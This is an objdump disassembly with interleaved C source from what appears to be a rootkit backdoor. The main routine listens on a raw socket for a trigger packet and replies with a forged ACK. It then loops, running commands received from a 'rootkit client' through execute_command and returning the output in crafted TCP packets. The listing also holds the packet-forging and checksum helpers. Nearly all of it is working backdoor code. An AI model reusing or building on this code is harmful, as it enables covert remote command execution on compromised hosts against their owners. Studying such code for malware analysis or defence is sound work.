  4016df:	8b 7d b0             	mov    -0x50(%rbp),%edi
  4016e2:	48 8b 75 c8          	mov    -0x38(%rbp),%rsi
  4016e6:	48 63 45 ac          	movslq -0x54(%rbp),%rax
  4016ea:	48 01 c6             	add    %rax,%rsi
  4016ed:	ba 01 00 00 00       	mov    $0x1,%edx
  4016f2:	e8 99 f9 ff ff       	call   401090 <write@plt>
        ii++;
  4016f7:	8b 45 ac             	mov    -0x54(%rbp),%eax
  4016fa:	83 c0 01             	add    $0x1,%eax
  4016fd:	89 45 ac             	mov    %eax,-0x54(%rbp)
    while(*(timestr+ii)!='\0'){
  401700:	e9 c5 ff ff ff       	jmp    4016ca <main+0x1aa>
    }
    write(fd, "\t", 1);
  401705:	8b 7d b0             	mov    -0x50(%rbp),%edi
  401708:	48 be c0 30 40 00 00 	movabs $0x4030c0,%rsi
  40170f:	00 00 00 
  401712:	ba 01 00 00 00       	mov    $0x1,%edx
  401717:	e8 74 f9 ff ff       	call   401090 <write@plt>
    
    ii = 0;
  40171c:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%rbp)
    while(*(argv[0]+ii)!='\0'){
  401723:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401727:	48 8b 00             	mov    (%rax),%rax
  40172a:	48 63 4d ac          	movslq -0x54(%rbp),%rcx
  40172e:	0f be 04 08          	movsbl (%rax,%rcx,1),%eax
  401732:	83 f8 00             	cmp    $0x0,%eax
  401735:	0f 84 29 00 00 00    	je     401764 <main+0x244>
        write(fd, argv[0]+ii, 1);
  40173b:	8b 7d b0             	mov    -0x50(%rbp),%edi
  40173e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401742:	48 8b 30             	mov    (%rax),%rsi
  401745:	48 63 45 ac          	movslq -0x54(%rbp),%rax
  401749:	48 01 c6             	add    %rax,%rsi
  40174c:	ba 01 00 00 00       	mov    $0x1,%edx
  401751:	e8 3a f9 ff ff       	call   401090 <write@plt>
        ii++;
  401756:	8b 45 ac             	mov    -0x54(%rbp),%eax
  401759:	83 c0 01             	add    $0x1,%eax
  40175c:	89 45 ac             	mov    %eax,-0x54(%rbp)
    while(*(argv[0]+ii)!='\0'){
  40175f:	e9 bf ff ff ff       	jmp    401723 <main+0x203>
    }

    write(fd, "\n", 1);
  401764:	8b 7d b0             	mov    -0x50(%rbp),%edi
  401767:	48 be cd 30 40 00 00 	movabs $0x4030cd,%rsi
  40176e:	00 00 00 
  401771:	ba 01 00 00 00       	mov    $0x1,%edx
  401776:	e8 15 f9 ff ff       	call   401090 <write@plt>
    write(fd, "Sniffing...\n", 13);
  40177b:	8b 7d b0             	mov    -0x50(%rbp),%edi
  40177e:	48 be c2 30 40 00 00 	movabs $0x4030c2,%rsi
  401785:	00 00 00 
  401788:	ba 0d 00 00 00       	mov    $0xd,%edx
  40178d:	e8 fe f8 ff ff       	call   401090 <write@plt>
    

    packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
  401792:	48 8d 7d 80          	lea    -0x80(%rbp),%rdi
  401796:	48 be cf 30 40 00 00 	movabs $0x4030cf,%rsi
  40179d:	00 00 00 
  4017a0:	e8 49 0b 00 00       	call   4022ee <rawsocket_sniff_pattern>
    if(packet.ipheader == NULL){
  4017a5:	48 83 7d 80 00       	cmpq   $0x0,-0x80(%rbp)
  4017aa:	0f 85 23 00 00 00    	jne    4017d3 <main+0x2b3>
        write(fd, "Failed to open rawsocket\n", 1);
  4017b0:	8b 7d b0             	mov    -0x50(%rbp),%edi
  4017b3:	48 be d6 30 40 00 00 	movabs $0x4030d6,%rsi
  4017ba:	00 00 00 
  4017bd:	ba 01 00 00 00       	mov    $0x1,%edx
  4017c2:	e8 c9 f8 ff ff       	call   401090 <write@plt>
        return -1;
  4017c7:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
  4017ce:	e9 03 03 00 00       	jmp    401ad6 <main+0x5b6>
    }
    write(fd, "Sniffed\n", 9);
  4017d3:	8b 7d b0             	mov    -0x50(%rbp),%edi
  4017d6:	48 be f0 30 40 00 00 	movabs $0x4030f0,%rsi
  4017dd:	00 00 00 
  4017e0:	ba 09 00 00 00       	mov    $0x9,%edx
  4017e5:	e8 a6 f8 ff ff       	call   401090 <write@plt>
    //TODO GET THE IP FROM THE BACKDOOR CLIENT
    char* local_ip = getLocalIpAddress();
  4017ea:	e8 71 fc ff ff       	call   401460 <getLocalIpAddress>
  4017ef:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
    char remote_ip[16];
    inet_ntop(AF_INET, &(packet.ipheader->saddr), remote_ip, 16);
  4017f6:	48 8b 75 80          	mov    -0x80(%rbp),%rsi
  4017fa:	48 83 c6 0c          	add    $0xc,%rsi
  4017fe:	48 8d 95 60 ff ff ff 	lea    -0xa0(%rbp),%rdx
  401805:	bf 02 00 00 00       	mov    $0x2,%edi
  40180a:	b9 10 00 00 00       	mov    $0x10,%ecx
  40180f:	e8 1c f8 ff ff       	call   401030 <inet_ntop@plt>
    printf("IP: %s\n", local_ip);
  401814:	48 8b b5 78 ff ff ff 	mov    -0x88(%rbp),%rsi
  40181b:	48 bf f9 30 40 00 00 	movabs $0x4030f9,%rdi
  401822:	00 00 00 
  401825:	b0 00                	mov    $0x0,%al
  401827:	e8 c4 f8 ff ff       	call   4010f0 <printf@plt>
    
    packet_t packet_ack = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, CC_PROT_ACK);
  40182c:	48 8b 8d 78 ff ff ff 	mov    -0x88(%rbp),%rcx
  401833:	4c 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%r8
  40183a:	48 8d bd 38 ff ff ff 	lea    -0xc8(%rbp),%rdi
  401841:	be 40 1f 00 00       	mov    $0x1f40,%esi
  401846:	ba 28 23 00 00       	mov    $0x2328,%edx
  40184b:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
  401851:	48 b8 01 31 40 00 00 	movabs $0x403101,%rax
  401858:	00 00 00 
  40185b:	48 83 ec 10          	sub    $0x10,%rsp
  40185f:	48 89 04 24          	mov    %rax,(%rsp)
  401863:	e8 49 04 00 00       	call   401cb1 <build_standard_packet>
    if(rawsocket_send(packet_ack)<0){
  401868:	48 83 ec 20          	sub    $0x20,%rsp
  40186c:	48 8b 8d 58 ff ff ff 	mov    -0xa8(%rbp),%rcx
  401873:	48 89 e0             	mov    %rsp,%rax
  401876:	48 89 48 20          	mov    %rcx,0x20(%rax)
  40187a:	0f 10 85 38 ff ff ff 	movups -0xc8(%rbp),%xmm0
  401881:	0f 10 8d 48 ff ff ff 	movups -0xb8(%rbp),%xmm1
  401888:	0f 11 48 10          	movups %xmm1,0x10(%rax)
  40188c:	0f 11 00             	movups %xmm0,(%rax)
  40188f:	e8 fc 06 00 00       	call   401f90 <rawsocket_send>
  401894:	48 83 c4 30          	add    $0x30,%rsp
  401898:	83 f8 00             	cmp    $0x0,%eax
  40189b:	0f 8d 2b 00 00 00    	jge    4018cc <main+0x3ac>
        write(fd, "Failed to open rawsocket\n", 1);
  4018a1:	8b 7d b0             	mov    -0x50(%rbp),%edi
  4018a4:	48 be d6 30 40 00 00 	movabs $0x4030d6,%rsi
  4018ab:	00 00 00 
  4018ae:	ba 01 00 00 00       	mov    $0x1,%edx
  4018b3:	e8 d8 f7 ff ff       	call   401090 <write@plt>
        close(fd);
  4018b8:	8b 7d b0             	mov    -0x50(%rbp),%edi
  4018bb:	e8 90 f8 ff ff       	call   401150 <close@plt>
        return -1;
  4018c0:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
  4018c7:	e9 0a 02 00 00       	jmp    401ad6 <main+0x5b6>
    }

    //Start of pseudo connection with the rootkit client
    int connection_close = 0;
  4018cc:	c7 85 34 ff ff ff 00 	movl   $0x0,-0xcc(%rbp)
  4018d3:	00 00 00 
    while(!connection_close){
  4018d6:	83 bd 34 ff ff ff 00 	cmpl   $0x0,-0xcc(%rbp)
  4018dd:	0f 95 c0             	setne  %al
  4018e0:	34 ff                	xor    $0xff,%al
  4018e2:	a8 01                	test   $0x1,%al
  4018e4:	0f 85 05 00 00 00    	jne    4018ef <main+0x3cf>
  4018ea:	e9 d8 01 00 00       	jmp    401ac7 <main+0x5a7>
        packet_t packet = rawsocket_sniff_pattern(CC_PROT_MSG);
  4018ef:	48 8d bd 08 ff ff ff 	lea    -0xf8(%rbp),%rdi
  4018f6:	48 be 08 31 40 00 00 	movabs $0x403108,%rsi
  4018fd:	00 00 00 
  401900:	e8 e9 09 00 00       	call   4022ee <rawsocket_sniff_pattern>
        printf("Received client message\n");
  401905:	48 bf 10 31 40 00 00 	movabs $0x403110,%rdi
  40190c:	00 00 00 
  40190f:	b0 00                	mov    $0x0,%al
  401911:	e8 da f7 ff ff       	call   4010f0 <printf@plt>
        char* payload = packet.payload;
  401916:	48 8b 85 18 ff ff ff 	mov    -0xe8(%rbp),%rax
  40191d:	48 89 85 00 ff ff ff 	mov    %rax,-0x100(%rbp)
        char *p;
        p = strtok(payload, "#");
  401924:	48 8b bd 00 ff ff ff 	mov    -0x100(%rbp),%rdi
  40192b:	48 be 0e 31 40 00 00 	movabs $0x40310e,%rsi
  401932:	00 00 00 
  401935:	e8 06 f9 ff ff       	call   401240 <strtok@plt>
  40193a:	48 89 85 f8 fe ff ff 	mov    %rax,-0x108(%rbp)
        p = strtok(NULL, "#");
  401941:	31 c0                	xor    %eax,%eax
  401943:	89 c7                	mov    %eax,%edi
  401945:	48 be 0e 31 40 00 00 	movabs $0x40310e,%rsi
  40194c:	00 00 00 
  40194f:	e8 ec f8 ff ff       	call   401240 <strtok@plt>
  401954:	48 89 85 f8 fe ff ff 	mov    %rax,-0x108(%rbp)
        if(p){
  40195b:	48 83 bd f8 fe ff ff 	cmpq   $0x0,-0x108(%rbp)
  401962:	00 
  401963:	0f 84 59 01 00 00    	je     401ac2 <main+0x5a2>
            if(strcmp(p, CC_PROT_FIN_PART)==0){
  401969:	48 8b bd f8 fe ff ff 	mov    -0x108(%rbp),%rdi
  401970:	be 29 31 40 00       	mov    $0x403129,%esi
  401975:	e8 16 f8 ff ff       	call   401190 <strcmp@plt>
  40197a:	83 f8 00             	cmp    $0x0,%eax
  40197d:	0f 85 20 00 00 00    	jne    4019a3 <main+0x483>
                printf("Connection closed by request\n");
  401983:	48 bf 30 31 40 00 00 	movabs $0x403130,%rdi
  40198a:	00 00 00 
  40198d:	b0 00                	mov    $0x0,%al
  40198f:	e8 5c f7 ff ff       	call   4010f0 <printf@plt>
                connection_close = 1;
  401994:	c7 85 34 ff ff ff 01 	movl   $0x1,-0xcc(%rbp)
  40199b:	00 00 00 
            }else{
  40199e:	e9 1a 01 00 00       	jmp    401abd <main+0x59d>
                printf("Received request: %s\n", p);
  4019a3:	48 8b b5 f8 fe ff ff 	mov    -0x108(%rbp),%rsi
  4019aa:	48 bf 4e 31 40 00 00 	movabs $0x40314e,%rdi
  4019b1:	00 00 00 
  4019b4:	b0 00                	mov    $0x0,%al
  4019b6:	e8 35 f7 ff ff       	call   4010f0 <printf@plt>
                char* res = execute_command(p);
  4019bb:	48 8b bd f8 fe ff ff 	mov    -0x108(%rbp),%rdi
  4019c2:	e8 b9 f9 ff ff       	call   401380 <execute_command>
  4019c7:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
                char* payload_buf = calloc(4096, sizeof(char));
  4019ce:	bf 00 10 00 00       	mov    $0x1000,%edi
  4019d3:	be 01 00 00 00       	mov    $0x1,%esi
  4019d8:	e8 a3 f7 ff ff       	call   401180 <calloc@plt>
  4019dd:	48 89 85 e8 fe ff ff 	mov    %rax,-0x118(%rbp)
                strcpy(payload_buf, CC_PROT_MSG);
  4019e4:	48 8b bd e8 fe ff ff 	mov    -0x118(%rbp),%rdi
  4019eb:	be 08 31 40 00       	mov    $0x403108,%esi
  4019f0:	e8 7b f6 ff ff       	call   401070 <strcpy@plt>
                strcat(payload_buf, res);
  4019f5:	48 8b bd e8 fe ff ff 	mov    -0x118(%rbp),%rdi
  4019fc:	48 8b b5 f0 fe ff ff 	mov    -0x110(%rbp),%rsi
  401a03:	e8 48 f8 ff ff       	call   401250 <strcat@plt>
                packet_t packet_res = build_standard_packet(8000, 9000, local_ip, remote_ip, 4096, payload_buf);
  401a08:	48 8b 8d 78 ff ff ff 	mov    -0x88(%rbp),%rcx
  401a0f:	4c 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%r8
  401a16:	48 8b 85 e8 fe ff ff 	mov    -0x118(%rbp),%rax
  401a1d:	48 8d bd c0 fe ff ff 	lea    -0x140(%rbp),%rdi
  401a24:	be 40 1f 00 00       	mov    $0x1f40,%esi
  401a29:	ba 28 23 00 00       	mov    $0x2328,%edx
  401a2e:	41 b9 00 10 00 00    	mov    $0x1000,%r9d
  401a34:	48 83 ec 10          	sub    $0x10,%rsp
  401a38:	48 89 04 24          	mov    %rax,(%rsp)
  401a3c:	e8 70 02 00 00       	call   401cb1 <build_standard_packet>
                if(rawsocket_send(packet_res)<0){
  401a41:	48 83 ec 20          	sub    $0x20,%rsp
  401a45:	48 8b 8d e0 fe ff ff 	mov    -0x120(%rbp),%rcx
  401a4c:	48 89 e0             	mov    %rsp,%rax
  401a4f:	48 89 48 20          	mov    %rcx,0x20(%rax)
  401a53:	0f 10 85 c0 fe ff ff 	movups -0x140(%rbp),%xmm0
  401a5a:	0f 10 8d d0 fe ff ff 	movups -0x130(%rbp),%xmm1
  401a61:	0f 11 48 10          	movups %xmm1,0x10(%rax)
  401a65:	0f 11 00             	movups %xmm0,(%rax)
  401a68:	e8 23 05 00 00       	call   401f90 <rawsocket_send>
  401a6d:	48 83 c4 30          	add    $0x30,%rsp
  401a71:	83 f8 00             	cmp    $0x0,%eax
  401a74:	0f 8d 2b 00 00 00    	jge    401aa5 <main+0x585>
                    write(fd, "Failed to open rawsocket\n", 1);
  401a7a:	8b 7d b0             	mov    -0x50(%rbp),%edi
  401a7d:	48 be d6 30 40 00 00 	movabs $0x4030d6,%rsi
  401a84:	00 00 00 
  401a87:	ba 01 00 00 00       	mov    $0x1,%edx
  401a8c:	e8 ff f5 ff ff       	call   401090 <write@plt>
                    close(fd);
  401a91:	8b 7d b0             	mov    -0x50(%rbp),%edi
  401a94:	e8 b7 f6 ff ff       	call   401150 <close@plt>
                    return -1;
  401a99:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%rbp)
  401aa0:	e9 31 00 00 00       	jmp    401ad6 <main+0x5b6>
                }
                free(payload_buf);
  401aa5:	48 8b bd e8 fe ff ff 	mov    -0x118(%rbp),%rdi
  401aac:	e8 8f f5 ff ff       	call   401040 <free@plt>
                free(res);
  401ab1:	48 8b bd f0 fe ff ff 	mov    -0x110(%rbp),%rdi
  401ab8:	e8 83 f5 ff ff       	call   401040 <free@plt>
            }
        }
  401abd:	e9 00 00 00 00       	jmp    401ac2 <main+0x5a2>
    while(!connection_close){
  401ac2:	e9 0f fe ff ff       	jmp    4018d6 <main+0x3b6>
    }

    close(fd);
  401ac7:	8b 7d b0             	mov    -0x50(%rbp),%edi
  401aca:	e8 81 f6 ff ff       	call   401150 <close@plt>
    return 0;
  401acf:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
  401ad6:	8b 45 fc             	mov    -0x4(%rbp),%eax
  401ad9:	48 89 ec             	mov    %rbp,%rsp
  401adc:	5d                   	pop    %rbp
  401add:	c3                   	ret    

0000000000401ade <forge_TCP_checksum>:
#include "packetForger.h"

void forge_TCP_checksum(int payload_length, const char* source_ip_address, const char* destination_ip_address, struct tcphdr* tcpheader, char* payload){
  401ade:	f3 0f 1e fa          	endbr64 
  401ae2:	55                   	push   %rbp
  401ae3:	48 89 e5             	mov    %rsp,%rbp
  401ae6:	48 83 ec 50          	sub    $0x50,%rsp
  401aea:	89 7d dc             	mov    %edi,-0x24(%rbp)
  401aed:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
  401af1:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
  401af5:	48 89 4d c0          	mov    %rcx,-0x40(%rbp)
  401af9:	4c 89 45 b8          	mov    %r8,-0x48(%rbp)
    //We now compute the TCP checksum
        struct pseudo_header* psh = generatePseudoHeader(payload_length, source_ip_address, destination_ip_address);
  401afd:	8b 45 dc             	mov    -0x24(%rbp),%eax
  401b00:	0f b7 c0             	movzwl %ax,%eax
  401b03:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  401b07:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
  401b0b:	48 89 ce             	mov    %rcx,%rsi
  401b0e:	89 c7                	mov    %eax,%edi
  401b10:	e8 09 0d 00 00       	call   40281e <generatePseudoHeader>
  401b15:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
        if(!psh){
  401b19:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
  401b1e:	75 16                	jne    401b36 <forge_TCP_checksum+0x58>
            perror("Could not allocate memory for pseudo header");
  401b20:	48 8d 3d 41 16 00 00 	lea    0x1641(%rip),%rdi        # 403168 <_IO_stdin_used+0x168>
  401b27:	e8 04 f7 ff ff       	call   401230 <perror@plt>
            exit(1);
  401b2c:	bf 01 00 00 00       	mov    $0x1,%edi
  401b31:	e8 3a f7 ff ff       	call   401270 <exit@plt>
        }
        unsigned short tcp_checksum_size = (sizeof(struct pseudo_header) + sizeof(struct tcphdr)) + payload_length;
  401b36:	8b 45 dc             	mov    -0x24(%rbp),%eax
  401b39:	83 c0 20             	add    $0x20,%eax
  401b3c:	66 89 45 ee          	mov    %ax,-0x12(%rbp)
        unsigned short *tcp_checksum = malloc(tcp_checksum_size);
  401b40:	0f b7 45 ee          	movzwl -0x12(%rbp),%eax
  401b44:	48 89 c7             	mov    %rax,%rdi
  401b47:	e8 a4 f6 ff ff       	call   4011f0 <malloc@plt>
  401b4c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
        bzero(tcp_checksum, tcp_checksum_size);
  401b50:	0f b7 45 ee          	movzwl -0x12(%rbp),%eax
  401b54:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  401b58:	48 89 d1             	mov    %rdx,%rcx
  401b5b:	48 89 c2             	mov    %rax,%rdx
  401b5e:	be 00 00 00 00       	mov    $0x0,%esi
  401b63:	48 89 cf             	mov    %rcx,%rdi
  401b66:	e8 b5 f5 ff ff       	call   401120 <memset@plt>
        if(!tcp_checksum){
  401b6b:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
  401b70:	75 16                	jne    401b88 <forge_TCP_checksum+0xaa>
            perror("Could not allocate memory for tcp checksum");
  401b72:	48 8d 3d 1f 16 00 00 	lea    0x161f(%rip),%rdi        # 403198 <_IO_stdin_used+0x198>
  401b79:	e8 b2 f6 ff ff       	call   401230 <perror@plt>
            exit(1);
  401b7e:	bf 01 00 00 00       	mov    $0x1,%edi
  401b83:	e8 e8 f6 ff ff       	call   401270 <exit@plt>
        }
        memcpy(tcp_checksum, psh, sizeof(struct pseudo_header));
  401b88:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  401b8c:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401b90:	ba 0c 00 00 00       	mov    $0xc,%edx
  401b95:	48 89 ce             	mov    %rcx,%rsi
  401b98:	48 89 c7             	mov    %rax,%rdi
  401b9b:	e8 20 f6 ff ff       	call   4011c0 <memcpy@plt>
        memcpy(tcp_checksum+ (unsigned short) (sizeof(struct pseudo_header)/sizeof(unsigned short)), tcpheader, sizeof(struct tcphdr));
  401ba0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401ba4:	48 8d 48 0c          	lea    0xc(%rax),%rcx
  401ba8:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  401bac:	ba 14 00 00 00       	mov    $0x14,%edx
  401bb1:	48 89 c6             	mov    %rax,%rsi
  401bb4:	48 89 cf             	mov    %rcx,%rdi
  401bb7:	e8 04 f6 ff ff       	call   4011c0 <memcpy@plt>
        memcpy(tcp_checksum+ (unsigned short) ((sizeof(struct pseudo_header)+sizeof(struct tcphdr))/sizeof(unsigned short)), payload, payload_length);
  401bbc:	8b 45 dc             	mov    -0x24(%rbp),%eax
  401bbf:	48 63 d0             	movslq %eax,%rdx
  401bc2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401bc6:	48 8d 48 20          	lea    0x20(%rax),%rcx
  401bca:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  401bce:	48 89 c6             	mov    %rax,%rsi
  401bd1:	48 89 cf             	mov    %rcx,%rdi
  401bd4:	e8 e7 f5 ff ff       	call   4011c0 <memcpy@plt>
        compute_segment_checksum(tcpheader, tcp_checksum, tcp_checksum_size);
  401bd9:	0f b7 55 ee          	movzwl -0x12(%rbp),%edx
  401bdd:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
  401be1:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  401be5:	48 89 ce             	mov    %rcx,%rsi
  401be8:	48 89 c7             	mov    %rax,%rdi
  401beb:	e8 55 0d 00 00       	call   402945 <compute_segment_checksum>
        free(psh);
  401bf0:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401bf4:	48 89 c7             	mov    %rax,%rdi
  401bf7:	e8 44 f4 ff ff       	call   401040 <free@plt>
        free(tcp_checksum);
  401bfc:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401c00:	48 89 c7             	mov    %rax,%rdi
  401c03:	e8 38 f4 ff ff       	call   401040 <free@plt>
}
  401c08:	90                   	nop
  401c09:	c9                   	leave  
  401c0a:	c3                   	ret    

0000000000401c0b <reforge_TCP_checksum>:

void reforge_TCP_checksum(packet_t packet){
  401c0b:	f3 0f 1e fa          	endbr64 
  401c0f:	55                   	push   %rbp
  401c10:	48 89 e5             	mov    %rsp,%rbp
  401c13:	48 83 ec 10          	sub    $0x10,%rsp
    char* source_addr = malloc(sizeof(char)*32);
  401c17:	bf 20 00 00 00       	mov    $0x20,%edi
  401c1c:	e8 cf f5 ff ff       	call   4011f0 <malloc@plt>
  401c21:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    inet_ntop(AF_INET, (void*)&(packet.ipheader->saddr), source_addr, INET_ADDRSTRLEN);
  401c25:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401c29:	48 8d 70 0c          	lea    0xc(%rax),%rsi
  401c2d:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401c31:	b9 10 00 00 00       	mov    $0x10,%ecx
  401c36:	48 89 c2             	mov    %rax,%rdx
  401c39:	bf 02 00 00 00       	mov    $0x2,%edi
  401c3e:	e8 ed f3 ff ff       	call   401030 <inet_ntop@plt>
    char* dest_addr = malloc(sizeof(char)*32);
  401c43:	bf 20 00 00 00       	mov    $0x20,%edi
  401c48:	e8 a3 f5 ff ff       	call   4011f0 <malloc@plt>
  401c4d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    inet_ntop(AF_INET, (void*)&(packet.ipheader->daddr), dest_addr, INET_ADDRSTRLEN);
  401c51:	48 8b 45 10          	mov    0x10(%rbp),%rax
  401c55:	48 8d 70 10          	lea    0x10(%rax),%rsi
  401c59:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401c5d:	b9 10 00 00 00       	mov    $0x10,%ecx
  401c62:	48 89 c2             	mov    %rax,%rdx
  401c65:	bf 02 00 00 00       	mov    $0x2,%edi
  401c6a:	e8 c1 f3 ff ff       	call   401030 <inet_ntop@plt>
    packet.tcpheader->check = 0;
  401c6f:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401c73:	66 c7 40 10 00 00    	movw   $0x0,0x10(%rax)
    forge_TCP_checksum(packet.payload_length, source_addr, dest_addr, packet.tcpheader, packet.payload);
  401c79:	48 8b 7d 20          	mov    0x20(%rbp),%rdi
  401c7d:	48 8b 4d 18          	mov    0x18(%rbp),%rcx
  401c81:	8b 45 28             	mov    0x28(%rbp),%eax
  401c84:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  401c88:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
  401c8c:	49 89 f8             	mov    %rdi,%r8
  401c8f:	89 c7                	mov    %eax,%edi
  401c91:	e8 48 fe ff ff       	call   401ade <forge_TCP_checksum>
    free(source_addr);
  401c96:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  401c9a:	48 89 c7             	mov    %rax,%rdi
  401c9d:	e8 9e f3 ff ff       	call   401040 <free@plt>
    free(dest_addr);
  401ca2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  401ca6:	48 89 c7             	mov    %rax,%rdi
  401ca9:	e8 92 f3 ff ff       	call   401040 <free@plt>
}
  401cae:	90                   	nop
  401caf:	c9                   	leave  
  401cb0:	c3                   	ret    

0000000000401cb1 <build_standard_packet>:
    u_int16_t destination_port,
    const char* source_ip_address,
    const char* destination_ip_address,
    u_int32_t packet_length,
    char* payload
    ){
  401cb1:	f3 0f 1e fa          	endbr64 
  401cb5:	55                   	push   %rbp
  401cb6:	48 89 e5             	mov    %rsp,%rbp
  401cb9:	53                   	push   %rbx
  401cba:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
  401cc1:	48 89 7d 98          	mov    %rdi,-0x68(%rbp)
  401cc5:	89 d0                	mov    %edx,%eax
  401cc7:	48 89 4d 88          	mov    %rcx,-0x78(%rbp)
  401ccb:	4c 89 45 80          	mov    %r8,-0x80(%rbp)
  401ccf:	44 89 8d 7c ff ff ff 	mov    %r9d,-0x84(%rbp)
  401cd6:	89 f2                	mov    %esi,%edx
  401cd8:	66 89 55 94          	mov    %dx,-0x6c(%rbp)
  401cdc:	66 89 45 90          	mov    %ax,-0x70(%rbp)
        //First we build a TCP header
        struct tcphdr *tcpheader =  generate_tcp_header(source_port,destination_port,0,0,htons(5840));
  401ce0:	bf d0 16 00 00       	mov    $0x16d0,%edi
  401ce5:	e8 f6 f3 ff ff       	call   4010e0 <htons@plt>
  401cea:	0f b7 d0             	movzwl %ax,%edx
  401ced:	0f b7 75 90          	movzwl -0x70(%rbp),%esi
  401cf1:	0f b7 45 94          	movzwl -0x6c(%rbp),%eax
  401cf5:	41 89 d0             	mov    %edx,%r8d
  401cf8:	b9 00 00 00 00       	mov    $0x0,%ecx
  401cfd:	ba 00 00 00 00       	mov    $0x0,%edx
  401d02:	89 c7                	mov    %eax,%edi
  401d04:	e8 02 0a 00 00       	call   40270b <generate_tcp_header>
  401d09:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
        if(!tcpheader){
  401d0d:	48 83 7d a8 00       	cmpq   $0x0,-0x58(%rbp)
  401d12:	75 16                	jne    401d2a <build_standard_packet+0x79>
            perror("Could not allocate memory for tcp header");
  401d14:	48 8d 3d ad 14 00 00 	lea    0x14ad(%rip),%rdi        # 4031c8 <_IO_stdin_used+0x1c8>
  401d1b:	e8 10 f5 ff ff       	call   401230 <perror@plt>
            exit(1);
  401d20:	bf 01 00 00 00       	mov    $0x1,%edi
  401d25:	e8 46 f5 ff ff       	call   401270 <exit@plt>
        }
        int payload_length = strlen((const char*)payload);
  401d2a:	48 8b 7d 10          	mov    0x10(%rbp),%rdi
  401d2e:	e8 7d f3 ff ff       	call   4010b0 <strlen@plt>
  401d33:	89 45 a4             	mov    %eax,-0x5c(%rbp)
        //We copy the payload we were given, just in case they free memory on the other side
        forge_TCP_checksum(payload_length, source_ip_address, destination_ip_address, tcpheader, payload);
  401d36:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
  401d3a:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  401d3e:	48 8b 75 88          	mov    -0x78(%rbp),%rsi
  401d42:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  401d45:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  401d49:	89 c7                	mov    %eax,%edi
  401d4b:	e8 8e fd ff ff       	call   401ade <forge_TCP_checksum>
        
        //Now we build the whole packet and incorporate the previous tcpheader + payload
        char *packet = malloc(sizeof(char)*packet_length);
  401d50:	8b 85 7c ff ff ff    	mov    -0x84(%rbp),%eax
  401d56:	48 89 c7             	mov    %rax,%rdi
  401d59:	e8 92 f4 ff ff       	call   4011f0 <malloc@plt>
  401d5e:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
        bzero(packet, packet_length);
  401d62:	8b 85 7c ff ff ff    	mov    -0x84(%rbp),%eax
  401d68:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  401d6c:	48 89 d1             	mov    %rdx,%rcx
  401d6f:	48 89 c2             	mov    %rax,%rdx
  401d72:	be 00 00 00 00       	mov    $0x0,%esi
  401d77:	48 89 cf             	mov    %rcx,%rdi
  401d7a:	e8 a1 f3 ff ff       	call   401120 <memset@plt>

        //First we incorporate the IP header
        struct iphdr *ipheader = generate_ip_header(source_ip_address, destination_ip_address, payload_length);
  401d7f:	8b 45 a4             	mov    -0x5c(%rbp),%eax
  401d82:	0f b7 d0             	movzwl %ax,%edx
  401d85:	48 8b 4d 80          	mov    -0x80(%rbp),%rcx
  401d89:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  401d8d:	48 89 ce             	mov    %rcx,%rsi
  401d90:	48 89 c7             	mov    %rax,%rdi
  401d93:	e8 b9 0d 00 00       	call   402b51 <generate_ip_header>
  401d98:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
        //The IP header is the first element in the packet
        memcpy(packet, ipheader, sizeof(struct iphdr));
  401d9c:	48 8b 4d b8          	mov    -0x48(%rbp),%rcx
  401da0:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  401da4:	ba 14 00 00 00       	mov    $0x14,%edx
  401da9:	48 89 ce             	mov    %rcx,%rsi
  401dac:	48 89 c7             	mov    %rax,%rdi
